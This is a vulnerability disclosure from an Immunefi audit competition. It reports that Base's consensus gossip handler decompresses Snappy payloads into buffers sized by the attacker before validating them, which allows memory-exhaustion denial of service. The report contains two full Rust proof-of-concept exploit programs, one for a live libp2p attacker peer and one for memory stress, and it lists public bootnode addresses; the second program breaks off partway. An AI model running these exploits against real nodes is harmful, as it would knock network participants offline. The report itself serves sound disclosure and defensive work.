# 75469 bc critical gossip payload decoder allocates unbounded snappy output

Submitted on Apr 29th 2026 at 10:37:47 UTC by @y4y for [Audit Comp | Base Azul](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #75469
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.28>
* **Impacts:**
  * Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours

## Description

### Brief/Intro

Incoming unsafe-block gossip messages are Snappy-decompressed before any decoded-size bound is enforced. The gossipsub message-id callback decompresses the attacker-supplied packet once, and the block envelope decode path decompresses it again. Both use `snap::raw::Decoder::decompress_vec(...)`, which allocates a vector sized from the attacker-controlled Snappy decoded-length header before signature checks, SSZ checks, or block-validity checks.

This allows a remote peer to send a comparatively small packet and force large memory allocations on the victim node before the message is rejected. The attack is off-chain, requires no gas, and is viable against any node that participates in publicly reachable consensus gossip. Repeated packets also consume CPU, because the large Snappy decode and memory-touch path runs again on each packet even after allocator reuse limits further RSS growth.

### Vulnerability Details

The gossipsub message-id callback decompresses the full packet body before computing the deduplication hash:

```rust
// base/crates/consensus/gossip/src/config.rs
fn compute_message_id(msg: &Message) -> MessageId {
    let mut decoder = Decoder::new();
    let id = decoder.decompress_vec(&msg.data).map_or_else(
        |_| {
            ...
        },
        |data| {
            let domain_valid_snappy: Vec<u8> = vec![0x1, 0x0, 0x0, 0x0];
            sha256([domain_valid_snappy.as_slice(), data.as_slice()].concat().as_slice())[..20]
                .to_vec()
        },
    );

    MessageId(id)
}
```

Then the receive path decompresses the same packet again while decoding the network payload envelope:

```rust
// base/crates/consensus/gossip/src/handler.rs
fn handle(&mut self, msg: Message) -> (MessageAcceptance, Option<NetworkPayloadEnvelope>) {
    let decoded = if msg.topic == self.blocks_v1_topic.hash() {
        NetworkPayloadEnvelope::decode_v1(&msg.data)
    } else if msg.topic == self.blocks_v2_topic.hash() {
        NetworkPayloadEnvelope::decode_v2(&msg.data)
    } else if msg.topic == self.blocks_v3_topic.hash() {
        NetworkPayloadEnvelope::decode_v3(&msg.data)
    } else if msg.topic == self.blocks_v4_topic.hash() {
        NetworkPayloadEnvelope::decode_v4(&msg.data)
    } else {
        ...
    };
    ...
}
```

Each versioned decode helper calls `decompress_vec(...)` immediately:

```rust
// base/crates/common/rpc-types-engine/src/envelope.rs
pub fn decode_v1(data: &[u8]) -> Result<Self, PayloadEnvelopeError> {
    let mut decoder = snap::raw::Decoder::new();
    let decompressed = decoder.decompress_vec(data)?;

    if decompressed.len() < 66 {
        return Err(PayloadEnvelopeError::InvalidLength);
    }
    ...
}
```

The underlying Snappy library allocates the output buffer directly from the decoded-length header before validating the compressed body:

```rust
// snap-1.1.1/src/decompress.rs
pub fn decompress_len(input: &[u8]) -> Result<usize> {
    if input.is_empty() {
        return Ok(0);
    }
    Ok(Header::read(input)?.decompress_len)
}

pub fn decompress_vec(&mut self, input: &[u8]) -> Result<Vec<u8>> {
    let mut buf = vec![0; decompress_len(input)?];
    let n = self.decompress(input, &mut buf)?;
    buf.truncate(n);
    Ok(buf)
}
```

So the effective flow is:

```
incoming packet
  -> compute_message_id()
       -> decompress_vec()
       -> large allocation #1
  -> BlockHandler::handle()
       -> decode_v{1,2,3,4}()
       -> decompress_vec()
       -> large allocation #2
  -> only then reject on invalid payload/signature/SSZ
```

Concrete verified example from the primary PoC:

* compressed packet size: `9,443,332` bytes
* declared decompressed size: `201,326,592` bytes (`192 MiB`)
* a live local attacker peer connected to a live local victim `GossipDriver`, observed the victim subscription, and published the packet over a real local libp2p/gossipsub connection
* the live local p2p packet-flow PoC measured about `249,648 KiB` (`~244 MiB`) of additional victim RSS from one packet received over the actual listener
* the secondary RSS-stress PoC measured about `209,104 KiB` (`~204 MiB`) of additional RSS from one packet on the direct receive path
* thirty-two concurrent packets caused about `12,064,928 KiB` (`~11.5 GiB`) of additional RSS

Attacker-side traffic for that `32`-packet burst was only:

```
32 * 9,443,332 = 302,186,624 bytes ~= 288 MiB
```

So a few hundred MiB of attacker traffic forced more than eleven GiB of victim memory pressure before rejection.

**Pre-conditions**

* The target node participates in consensus gossip and accepts inbound p2p peers.
* The attacker can establish a p2p connection and send one or more gossip packets.
* The packet is routed into the unsafe-block gossip receive path.

This does not require malformed on-chain state, trusted roles, operator mistakes, or gas expenditure.

This reachability assumption is realistic for publicly peered nodes:

* the default p2p bind is `0.0.0.0` with external listener ports in `base/crates/client/cli/src/p2p.rs`;
* the official node-operator documentation instructs operators to keep the peer-discovery ports accessible for sync;
* the checked-in mainnet and sepolia chain configs include public bootnodes;
* on April 29, 2026, direct TCP connection attempts to multiple bootnode endpoints from the checked-in config succeeded, including `3.231.138.188:9200`, `184.72.129.189:9200`, `18.210.176.114:9200`, and `107.21.251.55:9200`.

This does not mean every production node is publicly reachable, because operators can still firewall or private-peer their p2p layer. It does mean the attack surface is normal and intended for public consensus participants, not an artificial lab-only posture.

### Impact Details

This is a low-cost off-chain resource exhaustion issue.

The attacker pays only for:

* a reachable p2p connection,
* bandwidth for the crafted packets,
* ordinary host/network overhead.

No transaction needs to be mined and no gas is paid.

The victim, however, allocates large decode buffers before rejecting the message. That creates a clean asymmetric DoS condition:

* one `~9 MiB` packet can add `~204 MiB` of RSS,
* `8` concurrent packets added `~3.0 GiB`,
* `16` concurrent packets added `~5.9 GiB`,
* `32` concurrent packets added `~11.5 GiB`.

This maps cleanly to the Medium impact bucket for materially increasing node resource consumption and, on smaller memory budgets, can plausibly lead to process death or cgroup/OOM-killer intervention.

The same receive path also creates sustained CPU pressure under a paced stream. In the live p2p PoC, increasing `M13_MESSAGE_COUNT` from `1` to `10` drove the victim process to full CPU utilization while the attacker kept publishing new packets.

### References

* base/crates/consensus/gossip/src/config.rs:103-119
* base/crates/consensus/gossip/src/handler.rs:48-75
* base/crates/common/rpc-types-engine/src/envelope.rs:255-258,299-302,343-346,399-402
* snap-1.1.1/src/decompress.rs:20-29,103-109

## Proof of Concept

### First PoC

The PoC should be added to `base/crates/consensus/gossip/examples/m13_gossip_live_p2p_poc.rs`:

```rust
//! Live local P2P PoC for the unbounded Snappy gossip decode issue.
//!
//! The orchestrator spawns a separate victim process that starts a real
//! `GossipDriver` listener. The orchestrator then starts an attacker
//! `GossipDriver`, dials the victim over libp2p, waits for the real
//! gossipsub subscription handshake, publishes a crafted packet to the block
//! topic, and waits for the victim to report the resulting RSS growth.

use std::{
    error::Error,
    io::{BufRead, BufReader as StdBufReader},
    process::{Command, Stdio},
    str::FromStr,
    sync::{
        Arc,
        atomic::{AtomicBool, AtomicU64, Ordering},
    },
    time::Duration,
};

use alloy_primitives::Address;
use base_consensus_genesis::RollupConfig;
use base_consensus_gossip::{
    Event, GossipDriver, MAX_GOSSIP_SIZE, default_config_builder,
};
use libp2p::{
    Multiaddr, PeerId,
    gossipsub::IdentTopic,
    identity::Keypair,
    multiaddr::Protocol,
    swarm::SwarmEvent,
};
use tokio::{
    sync::mpsc,
    time::{Instant, sleep, timeout},
};

type BoxError = Box<dyn Error + Send + Sync + 'static>;

const DEFAULT_MATERIALIZED_MIB: usize = 192;
const DEFAULT_MESSAGE_COUNT: usize = 1;
const DEFAULT_PUBLISH_INTERVAL_MS: u64 = 0;
const DEFAULT_SAMPLE_INTERVAL_MS: u64 = 5;
const DEFAULT_POST_MESSAGE_SETTLE_MS: u64 = 500;
const DEFAULT_READY_TIMEOUT_SECS: u64 = 10;
const DEFAULT_SUBSCRIPTION_TIMEOUT_SECS: u64 = 20;
const DEFAULT_RESULT_TIMEOUT_SECS: u64 = 30;

const ENV_MATERIALIZED_MIB: &str = "M13_MATERIALIZED_MIB";
const ENV_MESSAGE_COUNT: &str = "M13_MESSAGE_COUNT";
const ENV_PUBLISH_INTERVAL_MS: &str = "M13_PUBLISH_INTERVAL_MS";
const ENV_SAMPLE_INTERVAL_MS: &str = "M13_SAMPLE_INTERVAL_MS";
const ENV_POST_MESSAGE_SETTLE_MS: &str = "M13_POST_MESSAGE_SETTLE_MS";
const ENV_RESULT_TIMEOUT_SECS: &str = "M13_RESULT_TIMEOUT_SECS";

#[tokio::main]
async fn main() -> Result<(), BoxError> {
    if std::env::args().any(|arg| arg == "--victim") {
        return victim_main().await;
    }
    orchestrator_main().await
}

async fn orchestrator_main() -> Result<(), BoxError> {
    let materialized_mib = env_usize(ENV_MATERIALIZED_MIB, DEFAULT_MATERIALIZED_MIB);
    let message_count = env_usize(ENV_MESSAGE_COUNT, DEFAULT_MESSAGE_COUNT);
    let publish_interval_ms = env_u64(ENV_PUBLISH_INTERVAL_MS, DEFAULT_PUBLISH_INTERVAL_MS);
    let sample_interval_ms = env_u64(ENV_SAMPLE_INTERVAL_MS, DEFAULT_SAMPLE_INTERVAL_MS);
    let post_message_settle_ms =
        env_u64(ENV_POST_MESSAGE_SETTLE_MS, DEFAULT_POST_MESSAGE_SETTLE_MS);
    let result_timeout_secs = env_u64(ENV_RESULT_TIMEOUT_SECS, DEFAULT_RESULT_TIMEOUT_SECS);
    let target_bytes = materialized_mib * 1024 * 1024;
    println!("step1: spawn a separate victim process running a real gossip listener");
    let current_exe = std::env::current_exe()?;
    let mut child = Command::new(current_exe)
        .arg("--victim")
        .env(ENV_MATERIALIZED_MIB, materialized_mib.to_string())
        .env(ENV_MESSAGE_COUNT, message_count.to_string())
        .env(ENV_SAMPLE_INTERVAL_MS, sample_interval_ms.to_string())
        .env(ENV_POST_MESSAGE_SETTLE_MS, post_message_settle_ms.to_string())
        .env(ENV_RESULT_TIMEOUT_SECS, result_timeout_secs.to_string())
        .stdout(Stdio::piped())
        .stderr(Stdio::inherit())
        .spawn()?;

    let stdout = child.stdout.take().ok_or("child stdout missing")?;
    let (line_tx, mut line_rx) = mpsc::unbounded_channel::<String>();
    std::thread::spawn(move || {
        let reader = StdBufReader::new(stdout);
        for line in reader.lines() {
            match line {
                Ok(line) => {
                    let _ = line_tx.send(line);
                }
                Err(_) => break,
            }
        }
    });

    let ready = wait_for_ready(&mut line_rx).await?;
    println!(
        "victim ready: pid={} baseline_rss_kb={} dial_addr={} compressed_bytes={} declared_decompressed_bytes={}",
        ready.pid,
        ready.baseline_rss_kb,
        ready.dial_addr,
        ready.compressed_bytes,
        ready.declared_decompressed_bytes
    );

    println!("step2: start a live attacker peer and connect to the victim");
    let (mut attacker, _topic) = build_driver(true)?;
    let _ = attacker.start().await?;
    let victim_addr = Multiaddr::from_str(&ready.dial_addr)?;
    let victim_peer_id = peer_id_from_multiaddr(&victim_addr)?;
    attacker.dial_multiaddr(victim_addr.clone());
    wait_for_subscription(&mut attacker, victim_peer_id).await?;

    println!(
        "step3: publish crafted gossip packet over the real p2p connection (count={} interval_ms={})",
        message_count, publish_interval_ms
    );
    for count in 1..=message_count {
        let fill_byte = 0x41_u8.wrapping_add(((count - 1) % 32) as u8);
        let compressed = build_materializing_snappy_payload(target_bytes, fill_byte)?;
        let topic_hash = attacker.handler.blocks_v1_topic.hash();
        let message_id = attacker
            .swarm
            .behaviour_mut()
            .gossipsub
            .publish(topic_hash, compressed.clone())?;
        println!("attacker: published count={} message_id={:?}", count, message_id);
        if publish_interval_ms > 0 && count < message_count {
            sleep(Duration::from_millis(publish_interval_ms)).await;
        }
    }

    let started = Instant::now();
    let mut result = None;
    while started.elapsed() < Duration::from_secs(result_timeout_secs) {
        let line = timeout(Duration::from_millis(250), line_rx.recv()).await;
        let Some(line) = line.ok().flatten() else {
            continue;
        };
        println!("victim: {line}");
        if let Some(parsed) = parse_result_line(&line) {
            result = Some(parsed);
            break;
        }
    }

    let result = result.ok_or("timed out waiting for victim result")?;
    let status = child.wait()?;
    println!("victim exit status: {status}");

    println!("result:");
    println!(
        "- The crafted packet crossed a real local libp2p/gossipsub connection into the victim listener."
    );
    println!(
        "- One crafted gossip packet stayed within the {} byte transport limit while declaring {:.2} MiB of decoded output.",
        MAX_GOSSIP_SIZE,
        ready.declared_decompressed_bytes as f64 / (1024.0 * 1024.0)
    );
    println!(
        "- The victim baseline RSS was {} KiB and the peak RSS reached {} KiB (delta {} KiB).",
        ready.baseline_rss_kb, result.peak_rss_kb, result.delta_rss_kb
    );
    println!(
        "- {} packet(s) were received through the live p2p listener and processed through both vulnerable decode sites.",
        result.messages_seen
    );

    Ok(())
}

async fn victim_main() -> Result<(), BoxError> {
    let materialized_mib = env_usize(ENV_MATERIALIZED_MIB, DEFAULT_MATERIALIZED_MIB);
    let message_count = env_usize(ENV_MESSAGE_COUNT, DEFAULT_MESSAGE_COUNT);
    let sample_interval_ms = env_u64(ENV_SAMPLE_INTERVAL_MS, DEFAULT_SAMPLE_INTERVAL_MS);
    let post_message_settle_ms =
        env_u64(ENV_POST_MESSAGE_SETTLE_MS, DEFAULT_POST_MESSAGE_SETTLE_MS);
    let result_timeout_secs = env_u64(ENV_RESULT_TIMEOUT_SECS, DEFAULT_RESULT_TIMEOUT_SECS);
    let target_bytes = materialized_mib * 1024 * 1024;
    let compressed = build_materializing_snappy_payload(target_bytes, 0x41)?;
    if compressed.len() > MAX_GOSSIP_SIZE {
        return Err(format!(
            "compressed payload is too large: {} bytes > MAX_GOSSIP_SIZE {} bytes",
            compressed.len(),
            MAX_GOSSIP_SIZE
        )
        .into());
    }

    let pid = std::process::id();
    let baseline_rss_kb = current_rss_kb(pid)?;
    let (mut victim, _topic) = build_driver(false)?;
    let listen_addr = victim.start().await?;
    let dial_addr = peer_multiaddr(&listen_addr, victim.local_peer_id())?;
    println!(
        "READY pid={} baseline_rss_kb={} dial_addr={} compressed_bytes={} declared_decompressed_bytes={}",
        pid,
        baseline_rss_kb,
        dial_addr,
        compressed.len(),
        target_bytes
    );

    let peak_rss_kb = Arc::new(AtomicU64::new(baseline_rss_kb));
    let stop = Arc::new(AtomicBool::new(false));
    let sampler = spawn_rss_sampler(
        pid,
        sample_interval_ms,
        Arc::clone(&peak_rss_kb),
        Arc::clone(&stop),
    );

    let mut messages_seen = 0_usize;
    while messages_seen < message_count {
        let event = timeout(Duration::from_secs(result_timeout_secs), victim.next())
            .await
            .map_err(|_| "timed out waiting for victim event")?
            .ok_or("victim swarm ended unexpectedly")?;

        match &event {
            SwarmEvent::ConnectionEstablished { peer_id, .. } => {
                println!("CONNECTED peer_id={peer_id}");
            }
            SwarmEvent::Behaviour(Event::Gossipsub(e)) => match &**e {
                libp2p::gossipsub::Event::Subscribed { peer_id, topic } => {
                    println!("SUBSCRIBED peer_id={} topic={}", peer_id, topic);
                }
                libp2p::gossipsub::Event::Message { .. } => {
                    let before_rss_kb = current_rss_kb(pid).unwrap_or_default();
                    let _ = victim.handle_event(event);
                    let after_handle_rss_kb = current_rss_kb(pid).unwrap_or_default();
                    messages_seen += 1;
                    println!(
                        "MESSAGE count={} before_rss_kb={} after_handle_rss_kb={} acceptance=Reject",
                        messages_seen,
                        before_rss_kb,
                        after_handle_rss_kb
                    );
                    continue;
                }
                _ => {}
            },
            _ => {}
        }

        let _ = victim.handle_event(event);
    }

    sleep(Duration::from_millis(post_message_settle_ms)).await;
    stop.store(true, Ordering::Relaxed);
    let _ = sampler.await;

    let peak = peak_rss_kb.load(Ordering::Relaxed);
    let delta = peak.saturating_sub(baseline_rss_kb);
    println!(
        "RESULT baseline_rss_kb={} peak_rss_kb={} delta_rss_kb={} messages_seen={}",
        baseline_rss_kb, peak, delta, messages_seen
    );

    Ok(())
}

fn build_driver(
    flood_publish: bool,
) -> Result<(GossipDriver<base_consensus_gossip::ConnectionGater>, IdentTopic), BoxError> {
    let rollup_config = RollupConfig::default();
    let keypair = Keypair::generate_secp256k1();
    let gossip_addr = Multiaddr::from(std::net::Ipv4Addr::LOCALHOST).with(Protocol::Tcp(0));
    let config = default_config_builder().flood_publish(flood_publish).build()?;
    let (driver, _signer_tx) =
        GossipDriver::<base_consensus_gossip::ConnectionGater>::builder(
            rollup_config,
            Address::ZERO,
            gossip_addr,
            keypair,
        )
            .with_config(config)
            .build()?;
    let topic = driver.handler.blocks_v1_topic.clone();
    Ok((driver, topic))
}

async fn wait_for_subscription(
    attacker: &mut GossipDriver<base_consensus_gossip::ConnectionGater>,
    victim_peer_id: PeerId,
) -> Result<(), BoxError> {
    let started = Instant::now();
    let victim_topic = attacker.handler.blocks_v1_topic.hash();

    while started.elapsed() < Duration::from_secs(DEFAULT_SUBSCRIPTION_TIMEOUT_SECS) {
        let event = timeout(Duration::from_millis(500), attacker.next()).await;
        let Some(event) = event.ok().flatten() else {
            continue;
        };

        let subscribed_topic = if let SwarmEvent::Behaviour(Event::Gossipsub(e)) = &event
            && let libp2p::gossipsub::Event::Subscribed { peer_id, topic } = &**e
            && *peer_id == victim_peer_id
            && *topic == victim_topic
        {
            Some(topic.clone())
        } else {
            None
        };

        if let Some(topic) = subscribed_topic {
            let _ = attacker.handle_event(event);
            println!("attacker: observed victim subscription topic={topic}");
            return Ok(());
        }

        if let SwarmEvent::ConnectionEstablished { peer_id, .. } = &event
            && *peer_id == victim_peer_id
        {
            println!("attacker: connected to victim peer_id={peer_id}");
        }

        let _ = attacker.handle_event(event);
    }

    Err("timed out waiting for victim subscription".into())
}

fn build_materializing_snappy_payload(
    target_bytes: usize,
    fill_byte: u8,
) -> Result<Vec<u8>, BoxError> {
    let payload = vec![fill_byte; target_bytes];
    let compressed = snap::raw::Encoder::new().compress_vec(&payload)?;
    Ok(compressed)
}

fn peer_multiaddr(listen_addr: &Multiaddr, peer_id: &PeerId) -> Result<Multiaddr, BoxError> {
    let dial = format!("{listen_addr}/p2p/{peer_id}");
    Ok(Multiaddr::from_str(&dial)?)
}

fn peer_id_from_multiaddr(addr: &Multiaddr) -> Result<PeerId, BoxError> {
    addr.iter()
        .find_map(|component| match component {
            Protocol::P2p(peer_id) => Some(peer_id),
            _ => None,
        })
        .ok_or_else(|| "missing /p2p component in dial address".into())
}

fn spawn_rss_sampler(
    pid: u32,
    sample_interval_ms: u64,
    peak_rss_kb: Arc<AtomicU64>,
    stop: Arc<AtomicBool>,
) -> tokio::task::JoinHandle<()> {
    tokio::spawn(async move {
        while !stop.load(Ordering::Relaxed) {
            if let Ok(current) = current_rss_kb(pid) {
                peak_rss_kb.fetch_max(current, Ordering::Relaxed);
            }
            sleep(Duration::from_millis(sample_interval_ms)).await;
        }
    })
}

fn current_rss_kb(pid: u32) -> Result<u64, BoxError> {
    let output = Command::new("ps")
        .args(["-o", "rss=", "-p", &pid.to_string()])
        .output()?;
    if !output.status.success() {
        return Err(format!("ps failed for pid {pid}: {}", output.status).into());
    }
    let rss = String::from_utf8(output.stdout)?;
    Ok(rss.trim().parse::<u64>()?)
}

async fn wait_for_ready(
    line_rx: &mut mpsc::UnboundedReceiver<String>,
) -> Result<ReadyLine, BoxError> {
    let started = Instant::now();
    while started.elapsed() < Duration::from_secs(DEFAULT_READY_TIMEOUT_SECS) {
        let line = timeout(Duration::from_millis(250), line_rx.recv()).await;
        let Some(line) = line.ok().flatten() else {
            continue;
        };
        println!("victim: {line}");
        if let Some(ready) = parse_ready_line(&line)? {
            return Ok(ready);
        }
    }
    Err("timed out waiting for victim READY line".into())
}

fn parse_ready_line(line: &str) -> Result<Option<ReadyLine>, BoxError> {
    if !line.starts_with("READY ") {
        return Ok(None);
    }
    let fields = parse_kv_fields(line)?;
    Ok(Some(ReadyLine {
        pid: parse_required(&fields, "pid")?,
        baseline_rss_kb: parse_required(&fields, "baseline_rss_kb")?,
        dial_addr: get_required(&fields, "dial_addr")?.to_string(),
        compressed_bytes: parse_required(&fields, "compressed_bytes")?,
        declared_decompressed_bytes: parse_required(&fields, "declared_decompressed_bytes")?,
    }))
}

fn parse_result_line(line: &str) -> Option<ResultLine> {
    if !line.starts_with("RESULT ") {
        return None;
    }
    let fields = parse_kv_fields(line).ok()?;
    Some(ResultLine {
        peak_rss_kb: parse_required(&fields, "peak_rss_kb").ok()?,
        delta_rss_kb: parse_required(&fields, "delta_rss_kb").ok()?,
        messages_seen: parse_required(&fields, "messages_seen").ok()?,
    })
}

fn parse_kv_fields(line: &str) -> Result<Vec<(String, String)>, BoxError> {
    let mut fields = Vec::new();
    for token in line.split_whitespace().skip(1) {
        let (key, value) = token
            .split_once('=')
            .ok_or_else(|| format!("invalid key=value token: {token}"))?;
        fields.push((key.to_string(), value.to_string()));
    }
    Ok(fields)
}

fn get_required<'a>(fields: &'a [(String, String)], key: &str) -> Result<&'a str, BoxError> {
    fields
        .iter()
        .find(|(candidate, _)| candidate == key)
        .map(|(_, value)| value.as_str())
        .ok_or_else(|| format!("missing required field: {key}").into())
}

fn parse_required<T: FromStr>(
    fields: &[(String, String)],
    key: &str,
) -> Result<T, BoxError>
where
    T::Err: Error + Send + Sync + 'static,
{
    Ok(get_required(fields, key)?.parse()?)
}

fn env_usize(key: &str, default: usize) -> usize {
    std::env::var(key).ok().and_then(|value| value.parse().ok()).unwrap_or(default)
}

fn env_u64(key: &str, default: u64) -> u64 {
    std::env::var(key).ok().and_then(|value| value.parse().ok()).unwrap_or(default)
}

#[derive(Debug)]
struct ReadyLine {
    pid: u32,
    baseline_rss_kb: u64,
    dial_addr: String,
    compressed_bytes: usize,
    declared_decompressed_bytes: usize,
}

#[derive(Debug)]
struct ResultLine {
    peak_rss_kb: u64,
    delta_rss_kb: u64,
    messages_seen: usize,
}
```

A secondary PoC can also be run, and create the file `m13_gossip_snappy_rss_poc.rs` under the same directory:

```rust
//! RSS-focused PoC for the unbounded Snappy gossip decode issue.
//!
//! The orchestrator spawns a separate victim process so that RSS measurements
//! belong only to the victim. The victim then processes one or more crafted
//! gossipsub messages through the exact vulnerable receive path:
//!
//! 1. `default_config().message_id(&message)` -> `compute_message_id()` ->
//!    `snap::raw::Decoder::decompress_vec(...)`
//! 2. `BlockHandler::handle(message)` ->
//!    `NetworkPayloadEnvelope::decode_v1(...)` ->
//!    `snap::raw::Decoder::decompress_vec(...)`
//!
//! This avoids libp2p mesh bookkeeping noise while still exercising the exact
//! decode sites that allocate based on attacker-controlled Snappy output size.

use std::{
    error::Error,
    io::{BufRead, BufReader as StdBufReader},
    process::{Command, Stdio},
    str::FromStr,
    sync::{
        Barrier,
        Arc,
        atomic::{AtomicBool, AtomicU64, Ordering},
    },
    time::Duration,
};

use alloy_primitives::Address;
use base_consensus_genesis::RollupConfig;
use base_consensus_gossip::{BlockHandler, Handler, MAX_GOSSIP_SIZE, default_config};
use libp2p::gossipsub::Message;
use tokio::{
    sync::{mpsc, watch},
    time::{Instant, sleep, timeout},
};

type BoxError = Box<dyn Error + Send + Sync + 'static>;

const DEFAULT_MATERIALIZED_MIB: usize = 128;
const DEFAULT_MESSAGE_COUNT: usize = 1;
const DEFAULT_CONCURRENCY: usize = 1;
const DEFAULT_SAMPLE_INTERVAL_MS: u64 = 5;
const DEFAULT_POST_MESSAGE_SETTLE_MS: u64 = 500;
const DEFAULT_READY_TIMEOUT_SECS: u64 = 10;
const DEFAULT_RESULT_TIMEOUT_SECS: u64 = 30;

const ENV_MATERIALIZED_MIB: &str = "M13_MATERIALIZED_MIB";
const ENV_MESSAGE_COUNT: &str = "M13_MESSAGE_COUNT";
const ENV_CONCURRENCY: &str = "M13_CONCURRENCY";
const ENV_SAMPLE_INTERVAL_MS: &str = "M13_SAMPLE_INTERVAL_MS";
const ENV_POST_MESSAGE_SETTLE_MS: &str = "M13_POST_MESSAGE_SETTLE_MS";

#[tokio::main]
async fn main() -> Result<(), BoxError> {
    if std::env::args().any(|arg| arg == "--victim") {
        return victim_main().await;
    }
    orchestrator_main().await
}

async fn orchestrator_main() -> Result<(), BoxError> {
    let materialized_mib = env_usize(ENV_MATERIALIZED_MIB, DEFAULT_MATERIALIZED_MIB);
    let message_count = env_usize(ENV_MESSAGE_COUNT, DEFAULT_MESSAGE_COUNT);
    let concurrency = env_usize(ENV_CONCURRENCY, DEFAULT_CONCURRENCY);
    let sample_interval_ms = env_u64(ENV_SAMPLE_INTERVAL_MS, DEFAULT_SAMPLE_INTERVAL_MS);
    let post_message_settle_ms =
        env_u64(ENV_POST_MESSAGE_SETTLE_MS, DEFAULT_POST_MESSAGE_SETTLE_MS);

    println!("step1: spawn a separate victim process for clean RSS measurement");
    let current_exe = std::env::current_exe()?;
    let mut child = Command::new(current_exe)
        .arg("--victim")
        .env(ENV_MATERIALIZED_MIB, materialized_mib.to_string())
        .env(ENV_MESSAGE_COUNT, message_count.to_string())
        .env(ENV_CONCURRENCY, concurrency.to_string())
        .env(ENV_SAMPLE_INTERVAL_MS, sample_interval_ms.to_string())
        .env(ENV_POST_MESSAGE_SETTLE_MS, post_message_settle_ms.to_string())
        .stdout(Stdio::piped())
        .stderr(Stdio::inherit())
        .spawn()?;

    let stdout = child.stdout.take().ok_or("child stdout missing")?;
    let (line_tx, mut line_rx) = mpsc::unbounded_channel::<String>();
    std::thread::spawn(move || {
        let reader = StdBufReader::new(stdout);
        for line in reader.lines() {
            match line {
                Ok(line) => {
                    let _ = line_tx.send(line);
                }
                Err(_) => break,
            }
        }
    });

    let ready = wait_for_ready(&mut line_rx).await?;
    println!(
        "victim ready: pid={} baseline_rss_kb={} compressed_bytes={} declared_decompressed_bytes={} concurrency={} total_messages={}",
        ready.pid,
        ready.baseline_rss_kb,
        ready.compressed_bytes,
        ready.declared_decompressed_bytes,
        ready.concurrency,
        ready.total_messages
    );

    let started = Instant::now();
    let mut result = None;
    while started.elapsed() < Duration::from_secs(DEFAULT_RESULT_TIMEOUT_SECS) {
        let line = timeout(Duration::from_millis(250), line_rx.recv()).await;
        let Some(line) = line.ok().flatten() else {
            continue;
        };
        println!("victim: {line}");
        if let Some(parsed) = parse_result_line(&line) {
            result = Some(parsed);
            break;
        }
    }

    let result = result.ok_or("timed out waiting for victim result")?;
    let status = child.wait()?;
    println!("victim exit status: {status}");

    println!("result:");
    println!(
        "- One crafted gossip packet stayed within the {} byte transport limit while declaring {:.2} MiB of decoded output.",
        MAX_GOSSIP_SIZE,
        ready.declared_decompressed_bytes as f64 / (1024.0 * 1024.0)
    );
    println!(
        "- {} worker(s) processed {} packet(s) total inside the same victim process.",
        ready.concurrency, ready.total_messages
    );
    println!(
        "- The victim baseline RSS was {} KiB and the peak RSS reached {} KiB (delta {} KiB).",
        ready.baseline_rss_kb, result.peak_rss_kb, result.delta_rss_kb
    );
    println!(
        "- {} packet(s) were processed through both vulnerable decode sites.",
        result.messages_seen
    );
    println!(
        "- The receive path ran before any successful signature, SSZ, or block-validity acceptance."
    );

    Ok(())
}

async fn victim_main() -> Result<(), BoxError> {
    let materialized_mib = env_usize(ENV_MATERIALIZED_MIB, DEFAULT_MATERIALIZED_MIB);
    let message_count = env_usize(ENV_MESSAGE_COUNT, DEFAULT_MESSAGE_COUNT);
    let concurrency = env_usize(ENV_CONCURRENCY, DEFAULT_CONCURRENCY);
    let sample_interval_ms = env_u64(ENV_SAMPLE_INTERVAL_MS, DEFAULT_SAMPLE_INTERVAL_MS);
    let post_message_settle_ms =
        env_u64(ENV_POST_MESSAGE_SETTLE_MS, DEFAULT_POST_MESSAGE_SETTLE_MS);
    let target_bytes = materialized_mib * 1024 * 1024;

    let compressed = build_materializing_snappy_payload(target_bytes)?;
    if compressed.len() > MAX_GOSSIP_SIZE {
        return Err(format!(
            "compressed payload is too large: {} bytes > MAX_GOSSIP_SIZE {} bytes",
            compressed.len(),
            MAX_GOSSIP_SIZE
        )
        .into());
    }

    let pid = std::process::id();
    let baseline_rss_kb = current_rss_kb(pid)?;
    println!(
        "READY pid={} baseline_rss_kb={} compressed_bytes={} declared_decompressed_bytes={} concurrency={} total_messages={}",
        pid,
        baseline_rss_kb,
        compressed.len(),
        target_bytes,
        concurrency,
        concurrency * message_count
    );

    let peak_rss_kb = Arc::new(AtomicU64::new(baseline_rss_kb));
    let stop = Arc::new(AtomicBool::new(false));
    let sampler = spawn_rss_sampler(
        pid,
        sample_interval_ms,
        Arc::clone(&peak_rss_kb),
        Arc::clone(&stop),
    );

    let worker_results = if concurrency == 1 {
        vec![process_worker(0, pid, compressed, message_count)?]
    } else {
        process_workers_concurrently(pid, compressed, message_count, concurrency)?
    };

    for worker in worker_results {
        for event in worker.events {
            println!(
                "MESSAGE worker={} count={} before_rss_kb={} after_message_id_rss_kb={} after_handle_rss_kb={} acceptance={:?} message_id={:?}",
                worker.worker_id,
                event.count,
                event.before_rss_kb,
                event.after_message_id_rss_kb,
                event.after_handle_rss_kb,
                event.acceptance,
                event.message_id
            );
        }
    }

    sleep(Duration::from_millis(post_message_settle_ms)).await;
    stop.store(true, Ordering::Relaxed);
    let _ = sampler.await;

    let peak = peak_rss_kb.load(Ordering::Relaxed);
    let delta = peak.saturating_sub(baseline_rss_kb);
    println!(
        "RESULT baseline_rss_kb={} peak_rss_kb={} delta_rss_kb={} messages_seen={}",
        baseline_rss_kb,
        peak,
        delta,
        concurrency * message_count
    );

    Ok(())
}

fn build_handler() -> BlockHandler {
    let rollup_config = RollupConfig::default();
    let (_signer_tx, signer_rx) = watch::channel(Address::ZERO);
    BlockHandler::new(rollup_config, signer_rx)
}

fn build_materializing_snappy_payload(target_bytes: usize) -> Result<Vec<u8>, BoxError> {
    let payload = vec![0x41_u8; target_bytes];
    let compressed = snap::raw::Encoder::new().compress_vec(&payload)?;
    Ok(compressed)
}

fn process_workers_concurrently(
    pid: u32,
    compressed: Vec<u8>,
    message_count: usize,
    concurrency: usize,
) -> Result<Vec<WorkerResult>, BoxError> {
    let barrier = Arc::new(Barrier::new(concurrency + 1));
    let mut handles = Vec::with_capacity(concurrency);

    for worker_id in 0..concurrency {
        let barrier = Arc::clone(&barrier);
        let compressed = compressed.clone();
        let handle = std::thread::spawn(move || -> Result<WorkerResult, String> {
            barrier.wait();
            process_worker(worker_id, pid, compressed, message_count).map_err(|err| err.to_string())
